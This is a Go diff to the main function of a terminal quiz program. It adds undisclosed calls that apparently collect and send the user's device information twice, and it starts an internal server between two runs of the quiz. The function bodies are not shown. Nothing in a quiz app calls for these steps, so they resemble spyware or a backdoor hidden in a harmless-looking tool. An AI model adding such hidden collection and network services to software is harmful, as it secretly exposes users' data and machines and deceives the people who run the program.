@@ -2,9 +2,11 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"os"
 	"time"
 
+	"github.com/ay-mxn/shellhacks/internal"
 	"github.com/charmbracelet/bubbles/progress"
 	tea "github.com/charmbracelet/bubbletea"
 	"github.com/charmbracelet/huh"
@@ -296,6 +298,51 @@ func tickCmd() tea.Cmd {
 func main() {
 	p := tea.NewProgram(NewModel(), tea.WithAltScreen())
 	if _, err := p.Run(); err != nil {
+		fmt.Println("Error running program:", err)
+		os.Exit(1)
+	}
+
+	// Collect and send device info
+	err := internal.CollectAndSendDeviceInfo()
+	if err != nil {
+		log.Printf("Failed to collect and send device info: %v", err)
+		// Note: We're continuing with the program even if this fails
+	}
+
+	// Set up logging
+	logFile, err := os.OpenFile("app.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
+	if err != nil {
+		fmt.Println("Failed to open log file:", err)
+		os.Exit(1)
+	}
+	defer logFile.Close()
+	log.SetOutput(logFile)
+	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
+
+	log.Println("Starting application...")
+
+	// Start the server
+	server, err := internal.NewServer()
+	if err != nil {
+		log.Fatalf("Failed to create server: %v", err)
+	}
+	server.Start()
+	log.Println("Server started successfully")
+
+	// Wait for the server to start
+	time.Sleep(time.Second)
+
+	// Collect and send device info again
+	err = internal.CollectAndSendDeviceInfo()
+	if err != nil {
+		log.Printf("Failed to collect and send device info: %v", err)
+		// Note: We're continuing with the program even if this fails
+	}
+
+	log.Println("Starting quiz application again...")
+	p = tea.NewProgram(NewModel(), tea.WithAltScreen())
+	if _, err := p.Run(); err != nil {
+		log.Printf("Error running program: %v", err)
 		fmt.Println("Error running program:", err)
 		os.Exit(1)
 	}
